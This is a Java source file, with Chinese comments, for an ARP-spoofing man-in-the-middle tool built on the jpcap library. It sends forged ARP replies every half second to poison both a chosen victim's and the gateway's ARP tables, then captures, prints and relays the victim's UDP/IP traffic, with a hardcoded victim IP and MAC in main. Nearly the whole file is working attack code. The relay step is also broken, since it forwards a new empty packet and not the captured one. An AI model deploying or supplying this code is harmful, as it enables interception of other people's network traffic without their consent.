package netcap;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.Packet;

import java.io.IOException;
import java.net.InetAddress;

/**
 * @author Andrew
 * @date 2017/11/4
 */
public class ChangeARP {
    private NetworkInterface[] devices; //设备列表
    private NetworkInterface device; //要使用的设备
    private JpcapCaptor jpcap; //与设备的连接
    private JpcapSender sender; //用于发送的实例
    private byte[] targetMAC, gateMAC; //B的MAC地址，网关的MAC地址
    private String targetIp, gateIp; //B的IP地址，网关的IP地址
    /**
     *初始化设备
     * JpcapCaptor.getDeviceList()得到设备可能会有两个，其中一个必定是“Generic 
     *dialup adapter”，这是windows系统的虚拟网卡，并非真正的硬件设备。

     *注意：在这里有一个小小的BUG，如果JpcapCaptor.getDeviceList()之前有类似JFrame jf=new
     *JFame（）这类的语句会影响得到设备个数，只会得到真正的硬件设备，而不会出现虚拟网卡。
     *虚拟网卡只有MAC地址而没有IP地址，而且如果出现虚拟网卡，那么实际网卡的MAC将分
     *配给虚拟网卡，也就是说在程序中调用device. mac_address时得到的是00 00 00 00 00 00。

     */
    private void getDevice() throws IOException {
        devices = JpcapCaptor.getDeviceList(); //获得设备列表
        device = devices[0];//只有一个设备
        jpcap = JpcapCaptor.openDevice(device, 2000, true, 10000); //打开与设备的连接
        jpcap.setFilter("ip and udp",true); //只监听B的IP数据包
        sender = jpcap.getJpcapSenderInstance();

        }
    /**
     *修改B和网关的ARP表。因为网关会定时发数据包刷新自己和B的缓存表，所以必须每隔一
     *段时间就发一次包重新更改B和网关的ARP表。
     *@参数 targetMAC B的MAC地址，可通过ARP解析得到；
     *@参数 targetIp B的IP地址；
     *@参数 gateMAC 网关的MAC地址；
     */
    public ChangeARP(byte[] targetMAC, String targetIp, byte[] gateMAC, String gateIp) throws IOException, InterruptedException {
        this.targetMAC = targetMAC;
        this.targetIp = targetIp;
        this.gateMAC = gateMAC;
        this.gateIp = gateIp;
        getDevice();
        ARPPacket arpTarget = new ARPPacket(); //修改B的ARP表的ARP包
        arpTarget.hardtype = ARPPacket.HARDTYPE_ETHER; //选择以太网类型(Ethernet)
        arpTarget.prototype = ARPPacket.PROTOTYPE_IP; //选择IP网络协议类型
        arpTarget.operation = ARPPacket.ARP_REPLY; //选择REPLY类型
        arpTarget.hlen = 6; //MAC地址长度固定6个字节
        arpTarget.plen = 4; //IP地址长度固定4个字节
        arpTarget.sender_hardaddr = device.mac_address; //A的MAC地址
        arpTarget.sender_protoaddr = InetAddress.getByName(gateIp).getAddress(); //网关IP

        arpTarget.target_hardaddr = targetMAC; //B的MAC地址
        arpTarget.target_protoaddr = InetAddress.getByName(targetIp).getAddress(); //B的IP

        EthernetPacket ethToTarget = new EthernetPacket(); //创建一个以太网头
        ethToTarget.frametype = EthernetPacket.ETHERTYPE_ARP;//选择以太包类型
        ethToTarget.src_mac = device.mac_address; //A的MAC地址
        ethToTarget.dst_mac = targetMAC; //B的MAC地址
        arpTarget.datalink = ethToTarget; //将以太头添加到ARP包前
        ARPPacket arpGate = new ARPPacket(); //修改网关ARP表的包
        arpGate.hardtype = ARPPacket.HARDTYPE_ETHER; //跟以上相似，不再重复注析
        arpGate.prototype = ARPPacket.PROTOTYPE_IP;
        arpGate.operation = ARPPacket.ARP_REPLY;
        arpGate.hlen = 6;
        arpGate.plen = 4;
        arpGate.sender_hardaddr = device.mac_address;
        arpGate.sender_protoaddr = InetAddress.getByName(targetIp).getAddress();
        arpGate.target_hardaddr = gateMAC;
        arpGate.target_protoaddr = InetAddress.getByName(gateIp).getAddress();
        EthernetPacket ethToGate = new EthernetPacket();
        ethToGate.frametype = EthernetPacket.ETHERTYPE_ARP;
        ethToGate.src_mac = device.mac_address;
        ethToGate.dst_mac = gateMAC;
        arpGate.datalink = ethToGate;
        new Thread(new Runnable() { //创建一个线程控制发包速度
            public void run() {
                while (true) {
                    sender.sendPacket(arpTarget);
                    sender.sendPacket(arpGate);
                    try {
                        Thread.sleep(500);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }).start();
        recP(); //接收数据包并转发
    }
    /**
     *修改包的以太头，转发数据包
     *参数 packet 收到的数据包
     *参数 changeMAC 要转发出去的目标
     */
    private void send(Packet packet, byte[] changeMAC) {
        EthernetPacket eth;
        if (packet.datalink instanceof EthernetPacket) {
            eth = (EthernetPacket) packet.datalink;
            for (int i = 0; i < 6; i++) {
                eth.dst_mac[i] = changeMAC[i]; //修改包以太头，改变包的目标
                eth.src_mac[i] = device.mac_address[i]; //源发送者为A
            }
            sender.sendPacket(packet);
        }
    }
    /**
     *打印接受到的数据包并转发
     */
    public void recP() {
        IPPacket ipPacket = null;
        while (true) {
            ipPacket = (IPPacket) jpcap.getPacket();
            System.out.println(ipPacket);
            Packet packet = new Packet();
            if (ipPacket.src_ip.getHostAddress().equals(targetIp))
                send(packet, gateMAC);
            else
                send(packet, targetMAC);
        }
    }

    public static byte[] toByte(String mac){
        String[] arr = mac.split("-");
        byte[] macByte = new byte[6];
        for (int i = 0;i < arr.length;i++){
            Integer ad = Integer.parseInt(arr[i],16);
            macByte[i] = ad.byteValue();
        }
        return macByte;
    }
    public static void main(String[] args) throws IOException, InterruptedException {

        ChangeARP changeARP = new ChangeARP(toByte("38-B1-DB-51-6B-F3"),"192.168.1.103",toByte("C0-61-18-7E-34-4B"),"192.168.1.1");
//        System.out.println(toByte("38-B1-DB-51-6B-F3"));
//        Byte ad = Byte.parseByte("B1",16);
/*        int ad = Integer.parseInt("B1",16);
        byte b = (byte) (ad&0xff);*/
/*        Integer ad = Integer.parseInt("B1",16);
        byte b = ad.byteValue();*/
    }
}
